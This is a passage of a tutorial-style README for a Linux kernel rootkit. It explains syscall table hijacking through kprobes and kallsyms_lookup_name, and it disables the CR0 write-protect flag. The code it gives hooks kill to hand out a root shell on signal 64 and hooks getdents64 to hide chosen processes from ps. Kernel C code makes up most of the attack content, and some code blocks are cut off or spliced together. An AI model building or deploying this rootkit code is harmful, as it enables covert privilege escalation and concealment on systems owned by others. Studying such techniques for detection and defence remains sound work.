   We can see the address of syscall table from `/proc/kallsyms` file as sys_call_table is a dynamically loaded kernel modules symbol (remember this file? if not, please revisit: [link](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#part1-basics-regrading-lkm-creation) ).

   ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog11.png?raw=true)

   Why can we see it now, even before loading our module?/
        => Very simple, it is already in use by other kernel modules of linux.

   ### NOTE:
```
        As all the dynamically loaded kernel module symbols are stored in "/proc/kallsyms" file belongs to kernel mode, the executing code from usermode has 
        no ability to directly access hardware or reference memory. So, use `sudo` or root user to access the "/proc/kallsyms" file.
```
   Now, I think, you can get the idea why I have choosen **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique over others. This is because **`kallsyms_lookup_name()`** function will find out the address of the syscall table from `/proc/kallsyms` file and we can also cross-check the result generated by our code with the actual address as shown by `/proc/kallsyms` file. 

   Yeah!!! both will basically do the same thing, one is via `bash script` and other via `LKM`, but there is always a different level of satisfaction after coding a kernel program correctly :wink:/
        We will get the address of `syscall table` via **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique, as I mentioned it before.
        So now comes the time to show the trick, right?

   The trick is basically, we would make our own custom made `kallsyms_lookup_name()` function using ***kprobes***.

   According to this [blog: ish-ar.io/kprobes-in-a-nutshell](https://ish-ar.io/kprobes-in-a-nutshell/):\
   : **kprobe** can be used to <ins>dynamically break</ins> into _kernel routine_ and collect debugging information, i.e. via **dynamically loaded kernel module symbols**.
```c
        // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kprobes.h
        // https://elixir.bootlin.com/linux/v5.11/source/include/linux/kprobes.h#L62

        struct kprobe {
	        ...

	        /* location of the probe point */
	        kprobe_opcode_t *addr;

	        /* Allow user to indicate symbol name of the probe point */
	        const char *symbol_name;

          ...
          };
```
   We gonna need this two functions, one to set the function name, in this case, `kallsyms_lookup_name()` function and other to get the `address of the probe point`, i.e., the address of `kallsyms_lookup_name symbol` and eventually, the `address` of `sys_call_table`.

   Lets make our code to retrieve the address of the sys_call_table....

   1. Adding necessary libraries.
```c
        #include <linux/init.h>		/* Needed for the macros */
        #include <linux/module.h>	/* Needed by all modules */
        #include <linux/kernel.h>	/* Needed for printing log level messages */
        #include <linux/kprobes.h>
```
   2. Setting which _dynamic kernel symbol_ to find by utilizing the kprobe structure that I discussed earlier.
```c
        static struct kprobe kp = {
            .symbol_name = "kallsyms_lookup_name"
        };
```
   3. The main operation will take place in the entry function./
        For storing address of sys_call_table
```c
	      unsigned long *syscall_table;
```
   As kallsyms function is not exported anymore by default, we are creating our own custom made function to get the address of the original `kallsyms_lookup_name`.
```c
	      /* // Lookup the address for a symbol. Returns 0 if not found.
	       * unsigned long kallsyms_lookup_name(const char *name);
	       */
	      typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

	      kallsyms_lookup_name_t kallsyms_lookup_name;
```
   Function, `register_kprobe()` specifies where the probe is to be inserted and what handler is to be called when the probe is hit.
```c
        register_kprobe(&kp);
```
   To get the address of `kallsyms_lookup_name` symbol. As soon as storing of address of original `kallsyms_lookup_name` is done. No need of kprobes from now, so unregistering it.
```c
        kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

        unregister_kprobe(&kp);
```
   As we have got the address of `kallsyms_lookup_name` symbol, now we can use this to get the address of `syscall table`.
```c
        syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
```
   4. So the full code:
```c

   #### Output:
   ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog12.png?raw=true)

   Now, we can export both `kallsyms_lookup_name` as well as `sys_call_table`! :wink:. 

   #### Step2: <ins>Disabling the WP(write protection) flag in the control register</ins>.

   Before modifying the `syscall table`, we first need to disable the WP(write protection) flag in the control register (or cr0 reg) in order to make syscall table editable/writable, from read-only mode.

   According to [sysprog21.github.io/lkmpg/#system-calls](https://sysprog21.github.io/lkmpg/#system-calls):\
      _Control register (or cr0 reg) is a processor register that changes or controls the general behavior of the CPU. For x86 architecture, the cr0 register has various control flags that modify the basic operation of the processor. The WP flag in cr0 stands for write protection. Once the WP flag is set, the processor disallows further write attempts to the read-only sections._

   Therefore, we must disable the WP flag before modifying sys_call_table. => ***`WP flag must be set to 0`***.

      Reading the status/state of cr0 register.

```c
          cr0 = read_cr0();
```
#### NOTE:
```
          read_cr0(): Reading the status/state of cr0 register.
          write_cr0(): Writing to the cr0 register.
```

      Setting WP flag in cr0 register to `zero`. But how to do it?
         
         According to [change-value-of-wp-bit-in-cr0](https://hadfiabdelmoumene.medium.com/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411):
         As we are already in ring-0 ,i.e. in kernel mode, we already can write directly to cr0 registry and we don’t need to call write_cr0() function.
         We will be using ***this function*** to **write in cr0 register** instead of standard `write_cr0() function`.
    
         Here, `__force_order` is used to force instruction serialization.
```c
          static inline void write_cr0_forced(unsigned long val)
          {
            unsigned long __force_order;

            asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
          }
```

      Now, we will be using this function, `write_cr0_forced` to set WP flag to zero in cr0 register.
```c
          static inline void unprotect_memory(void)
          {
            pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
            write_cr0_forced(cr0 & ~0x00010000);    // Setting WP flag to 0 => writable
          }
```
   #### Step3: <ins>Performing the actual hooking</ins>.

   According to this [blog](https://xcellerator.github.io/posts/linux_rootkits_02/#how-the-kernel-handles-syscalls):\
      The arguments that we pass from usermode are stored in registers (if you have done some RE, you should have known that, right?), then this values are stored in a special struct called [pt_regs](https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12), which is then passed to the syscall, then syscall performs its work and go through the members of the passed stucture in which it is interested in. 

   So, => We gonna need pt_regs to do our shit!

   I actually intercepted two syscalls:\
      1. **kill syscall**: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L708)

   Took this from [xcellerator](https://xcellerator.github.io/posts/linux_rootkits_03/). In this blog, _"the ftrace helper method"_ is implemented, instead of that I will be using _"the syscall table hijacking method"_ to perform the same syscall interception. I just want you guys/gals to go through the aforementioned blog once (from [top](https://xcellerator.github.io/posts/linux_rootkits_03/) till [_Hooking Kill_](https://xcellerator.github.io/posts/linux_rootkits_03/#hooking-kill) portion) before going on with this blog. It will help you as I have took most of the `syscall interception` portion from that blog apart from _"the syscall table hijacking method"_.

   Now, it's time to perform hooking.\
          But, what is hooking exactly?\
          Hooking, in terms of syscall, is to manipulate with the original syscall with our very own malicious syscall, sort of man-in-the-middle attack scenario.\
          Remember, we made the syscall table [editable](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#step2-disabling-the-wpwrite-protection-flag-in-the-control-register) 'cause we want to edit original syscall in `syscall table` with our very own mal. syscall./
          > ***NOTE*** : In programming world, syscall is nothing but a function.

   As soon as we made the `sys_call_table` unprotected, we would edit that specific syscall in syscall table that we are interested in. We should make a ***note*** that as we are overwriting original syscall function with our very own mal. syscall function, the nature of the later must be identical to the prior, otherwise this technique ***wouldn't work***.

   The name of kill syscall (or sys_kill) in sys_call_table is ***__NR_kill*** (offset designated for sys_kill), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L87).

   1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L42)\
              So, let's define a custom function type to store original syscall, i.e., ***__NR_kill***.
```c
              typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
```
   As I have told you earlier that struct ***pt_regs*** is the one which has CPU registers as members of it, which will store passed arguements from usermode, which will eventually be read by syscall, right?\
          2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L45)
              Creating function to store original syscall, i.e., ***__NR_kill***.
```c
             static tt_syscall orig_kill;
```
   3. Let's store the original syscall
```c
             orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
```
   As, ***__NR_kill*** is the name of kill syscall (or, sys_kill) in **syscall table** and the function type of orig_kill is _`tt_syscall`_.\
          4. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/9134a4d04bf6c0d347a22503b203bab9098b8eea/kernel_src/reveng_rtkit.c#L311), ignore those lines with **__NR_getdents64** (line no.: 310 and 315). I will explain **__NR_getdents64** seperately after completing this section.

   Now, we stored the original syscall, rather backuped the original syscall, as this would be used later to revert back to normal syscall workflow while rmmod'ing our LKM aka. rootkit (in this scenario).\
             So lets unprotect the memory and edit the syscall table and then revert back the memory protection as it was.
```c
              orig_kill = (tt_syscall)__sys_call_table[__NR_kill];

              unprotect_memory();

              __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

              protect_memory();
```
   You might be thinking, what the heck is hacked_kill?\
              It is actually the function (mal. syscall) that we created, which I will introduce you in the next step.\
            5. So, now what ?\
Remember that? **providing rootshell** portion earlier in this blog (if not, please go and [visit](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#part6-providing-rootshell-to-the-attacker), it's obvious to forget as this blog is pretty long, don't be harsh on yourself! :hugs:)\
              We will be implementing that _getting rootshell_ mechanism via _kill syscall_.
```c
                  static void set_root(void)
                  {
                    /*

                     *      kgid_t          fsgid;          // GID for VFS ops
                     *      ...

                    struct cred *root = prepare_creds();

                    if (root == NULL)
                    {

                  static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)

                    int sig = (int) pt_regs->si;

                            set_root();
                            break;
                      default:
                            return orig_kill(pt_regs);
                    }
                    return 0;
                  }
```
   If you visit [<ins>Linux Syscall Reference</ins>](https://syscalls64.paolostivanin.com/), and search for _sys_kill_ you can see that it depends on 3 registers, **rax** (which contains the syscall id), **rdi** (which contians the file descriptor) and **rsi** (which is the location, where the passed arguments is to be stored). 
                  
   So here, we are only concerned about **rsi** register as we are interested in the arguments that are passed. We can see that we indeed need `int sig` to be placed in ***si*** register.

   So, that means:
```c
                  #define GET_ROOT 64

                  static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
                  {
                    int sig = (int) pt_regs->si;

                    switch (sig)
                    {
                      case GET_ROOT:
                            printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t-> Offering root shell!!");
                            /*
                                  In someway system() function alike kernel function present in linux kernel programming

                            */
                            set_root();
                            break;
                      default:
                            return orig_kill(pt_regs);
                    }
                    return 0;
                  }
```
   line2 :&nbsp; `int sig = (int) pt_regs->si` => Stores the passed argument, in this case it is: `64`, [source](https://xcellerator.github.io/posts/linux_rootkits_03/) (Only the 1st portion before _Hooking kill_).

   Now, if the passed argument/ signal (or sig) is same as `GET_ROOT` (which is a macro defined) then we are gifted with a _rootshell_.

   #### Now the question comes, "Why _`si`_ register, why not _`rsi`_ register?"

   ***Ans***: Please follow the [commented lines](https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12).

   I have told you earlier that the function type of original syscall must be same as the created syscall.
```
                  static unsigned long *__sys_call_table;
                  
                  typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
                  static tt_syscall orig_kill;
                  orig_kill = (tt_syscall)__sys_call_table[__NR_kill];

                  and

                  static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
                  __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
```
   If you compare all the lines, you will see each function types are satisfying other function types, i.e. there is no function type mismatch. Although, if it doesn't match, obviously compiler will through you an error. I just showed this portion to you, as I was dealing with this same problem while creating this project.

   6. So, the whole code to get the rootshell via `sys_kill interception`:
```c
                  // filename: Test_hook_kill.h

   Here, the type of this function is `asmlinkage int`, actually it doesn't matter in this context, but it might in others.\
                Syscalls are of type `long`, thus, when a user space program such as glibc depends on its return value, it expects a `long int`, if you feed it with `int`, things will go very wrong.\

   Now, lets see it in action:

   ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog13.png?raw=true)

   We can see 3 things:\
              1. In ***fish shell***, this mechanism of getting root shell is not working, I don't really know why... (<ins>If any viewers seeing this, have any solution to this problem, please don't hesitate to do a PR to my repo but before that please visit, [idea](https://github.com/reveng007/reveng_rtkit#note-1)</ins>).\
              2. In ***bash shell***, it is working as expected.\
              3. In ***sh shell***, it is working as expected too.

2. **getdents64** syscall: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L487)

   I actually wanted to hide ongoing processes and I got that idea for hiding processes from [source1: R3x/linux-rootkits](https://github.com/R3x/linux-rootkits#features-descriptions), but I was unable to understand that portion of code which was linked. I then searched through other [resource links](https://github.com/reveng007/reveng_rtkit#resources-that-helped-me) that I had. I found out this: [source2](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.). I will be implementing this mechanism via **kill syscall** (or sys_kill) as I did earlier.
          
    But here, we are actually intercepting two syscalls simultaneously,\
    1. ***kill syscall***: To hide pid of any process, cmd: _`kill -32 <pid>`_.\
    2. ***getdents64 syscall***: Please go through this [link](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.) (it is the same previous link) and check the last 2 paragraphs of it. It will say that, `ps` command only just does an 'ls' on "`/proc/`" directory.\

   Now then, what is the working machanism of `ls`?\
   Visit: [gist-amitsaha](https://gist.github.com/amitsaha/8169242#how-does-ls-do-what-it-does). It says that, after the execution of `ls`, it in turn invokes the `getdents()` system call, which is responsible to read the directory contents.\
   Let's check it.
```diff
              $ strace ls 1>/dev/null 2>/tmp/ls.strace; cat /tmp/ls.strace | cut -d'(' -f1 | sort -u

              access
              arch_prctl
              brk
              close
              execve
              +++ exited with 0 +++
              exit_group
              + getdents64    -----> We can see that it performs getdents64 syscall
              ioctl
              mmap
              mprotect
              munmap
              newfstatat
              openat
              pread64
              prlimit64
              read
              rt_sigaction
              rt_sigprocmask
              set_robust_list
              set_tid_address
              statfs
              write
```
   In that sense, if I perform the same thing with `ps`, we should be also getting the same `getdents()` system call.
```diff
              $ strace ps 1>/dev/null 2>/tmp/ps.strace; cat /tmp/ps.strace | cut -d'(' -f1 | sort -u

              access
              arch_prctl
              brk
              close
              execve
              +++ exited with 0 +++
              exit_group
              futex
              + getdents64    -----> We can see that it performs the same getdents64 syscall
              geteuid
              ioctl
              lseek
              mmap
              mprotect
              munmap
              newfstatat
              openat
              prctl
              pread64
              prlimit64
              read
              rt_sigaction
              rt_sigprocmask
              set_robust_list
              set_tid_address
              write
```
   So, we have to intercept getdents64 syscall.\
   Let's visit the [<ins>Linux Syscall Reference</ins>](https://syscalls64.paolostivanin.com/),\
   Search: `sys_getdents64`.

   Dependent registers:
```
1. rax: contains syscall ids.
2. rdi: which contains the file descriptor.
3. rsi: which contains the passed arguments.
4. rdx: length of the passed argument(or string).
```
   In this scenario, we will only need **rdi** and **rsi** register. This is because, we need to know the passed argument (**rsi** register, rather **si** register) and as we will be dealing with files, we will ofcourse be needing the file descriptors (**rdi** register, rather **di** register). (Reason was mentioned earlier in this file)

   So, a recap about the Workflow of the machanism:\
    - When we deliver pid of any process via `kill -32 <pid>`, it will at first find out that particular `pid` by surfing through "`/proc/`" directory.
    - After getting the `pid`, it will perform syscall hooking to hide that particular pid and then offering a new process list (excluding the mentioned pid), if the user tries to see running processes using ***ps***.

   1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L99).
   Finding the process id/ pid:\
   According to [LKM_HACKING](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.):
```c
	/* Here, -"&gt;" is the html character entities, which really mean: -">" 
	I really don't know, how it happened in that site */

	/* get task structure from PID */
	struct task_struct *get_task(pid_t pid)
	{
		struct task_struct *p = current;
	do {
		if (p->pid == pid)
			return p;
		p = p->next_task;
	}
	while (p != current);
	return NULL;
}
```
   I wasn't understanding this portion, but yes I was getting an idea that it is looping to get the process ids. So, I tried for loop.
```c
// reveng_rtkit

#include <linux/sched.h>        /* task_struct: Core info about all the tasks */

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *target_process = current;

	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601
	 * for loop macro
	 * #define for_each_process(p) \
	 * for (p = &init_task ; (p = next_task(p)) != &init_task ; )
	 */
	for_each_process(target_process)
	{
		if (target_process->pid == pid)
		{
			return target_process;
		}
	}
	return NULL;
}

   This is basically a for loop macro. I got this expression from  [diamorphine](https://github.com/m0nad/Diamorphine/) project. Then searched it in [bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601).

   We will now make a function to hide those directories responsible for corresponding `pid`. Got this portion from [heroin](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#A-b) and [diamorphine](https://github.com/m0nad/Diamorphine/) project.

   I made some changes,

   This code is same as before (the kill syscall portion), just `__NR_getdents64` is added (new), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L447). 

   Let us go step by step from `Test_hook_getdents64.h` file:
```c
// Test_hook_getdents64.h

#include <linux/slab.h>         /* kmalloc(), kfree(), kzalloc() */
#include <linux/fdtable.h>      /* Open file table structure: files_struct structure */
#include <linux/proc_ns.h>      /* For `PROC_ROOT_INO` */

struct linux_dirent {
    unsigned long   d_ino;		/* inode number */
    unsigned long   d_off;		/* offset to the next dirent */
    unsigned short  d_reclen;	/* length of this record */
    char            d_name[1];	/* filename */
};

static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
{
/* Dependent registers:
* rax: contains syscall ids = 0xd9
* rdi: which contains the file descriptor = unsigned int fd
* rsi: which contains the passed arguments = struct linux_dirent64 __user *dirent; "__user" => this pointer resides in user space
* rdx: length of the passed argument(or string) = unsigned int count
*/

    // Storing file descriptor 
    int fd = (int) pt_regs->di;

    /* User space related variable
* Storing the name of the directory passed from user space via "si" register
*/
    struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;

    int ret = orig_getdents64(pt_regs), err;
...
```
linux/slab.h: Will be used to allocate memories in ram for directory entries.
linux/fdtable.h: For accessing file table structure.
linux/proc_ns.h: For using `PROC_ROOT_INO`. I will explain it, when the time comes.

Now to the next part:
```c
...
	// kernel space related variables
	unsigned short proc = 0;
	unsigned long offset = 0; 
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;

	//For storing the directory inode value
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L680
	 * 
 	 * kzalloc - allocate memory. The memory is set to zero.
	 * @size: how many bytes of memory are required.
	 * @flags: the type of memory to allocate (see kmalloc).
	 *
	 * static inline void *kzalloc(size_t size, gfp_t flags)
	 */
	 /* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L538
	  *
	  * Below is a brief outline of the most useful GFP flags
	  * %GFP_KERNEL
	  *      Allocate normal kernel ram. May sleep.
	  */
	kdirent = kzalloc(ret, GFP_KERNEL);
	
	if (kdirent == NULL)
		return ret;
   
	// Copying directory name (or pid name) from userspace to kernel space
	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;
	 ...

	err = copy_to_user(dirent, kdirent, ret);

	   if (err)
	   {
	     goto out;
	   }

	   out:
	      kfree(kdirent);
	      return ret;
```
   Those kernel space and user space variables will mostly be used in `copy_from_user` and `copy_to_user` functions as we are going to pass arguments from _user space variable_ to _kernel space variable_ and vice-versa. Being in user space we can't read kernel space pointers/variables and vice-versa, that's the reason why `copy_from_user` and `copy_to_user` functions will be used.\
   In this scenario, `copy_from_user` is used to pass the name of the passed _directory name_ to kernel mode variable, _kdirent_ and then we will hide whatever we want to hide and lastly, we will send the output using `copy_to_user` to the user space variable, _dirent_.

   For the case of ***kzalloc***, `GFP_KERNEL` is _GFP flag_ which is used for kernel-internal allocations, [source: elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/gfp.h#L245).

   The last thing, which need explanation is the <ins>error part</ins>. If some error occurs, like sending <ins>wrong</ins> `pid` number to kernel space, we will free the allocated memory pointed by the kdirent pointer and would return the error which actually occured.

   Next part:
```c
                   // Storing the inode value of the required directory(or pid) 
                   d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

                   if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
                            /*&& MINOR(d_inode->i_rdev) == 1*/)
                            proc = 1;
                    ...
```
  I paraphrased from [jm33.me](https://jm33.me/linux-rootkit-for-fun-and-profit-0x02-lkm-hide-filesprocs.html):\
  This piece of code checks if current `fd` points to proc fs, if yes, we say we are `ls`ing a `/proc` dir. `i_ino` is a inode number, representing its index number in linux vfs (virtual filesystem), `PROC_ROOT_INO` is defined as 1: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/proc_ns.h#L42).
```c
/*
 * We always define these enumerators
 */
enum {
	PROC_ROOT_INO		= 1,
	PROC_IPC_INIT_INO	= 0xEFFFFFFFU,
	PROC_UTS_INIT_INO	= 0xEFFFFFFEU,
	PROC_USER_INIT_INO	= 0xEFFFFFFDU,
	PROC_PID_INIT_INO	= 0xEFFFFFFCU,
	PROC_CGROUP_INIT_INO	= 0xEFFFFFFBU,
	PROC_TIME_INIT_INO	= 0xEFFFFFFAU,
    };
```
   That means, if `i_ino` of any inode is same as `PROC_ROOT_INO`, its name will be `/proc`.
   
   The final part of the getdents64 syscall:
```c
	// Changes which we will do
	while (offset < ret)
	{
	dir = (void *)kdirent + offset;

	if ((proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
	{
		if (dir == kdirent)
		{
			ret -= dir->d_reclen;
			memmove(dir, (void *)dir + dir->d_reclen, ret);
			continue;
		}
		prev->d_reclen += dir->d_reclen;
	}
	else
	{
		prev = dir;
	}
	offset += dir->d_reclen;
}
```
   The while loop goes through the _array of dirent_ returned by getdents64 (or, in this context orig_getdents64).\
   It checks whether.
   1. The directory entry within the _array of dirent_ is in `/proc/` directory
   2. It is invisible

   It then performs the changes to the `kdirent` then eventually to `dirent`, so that it can be passed to user space.
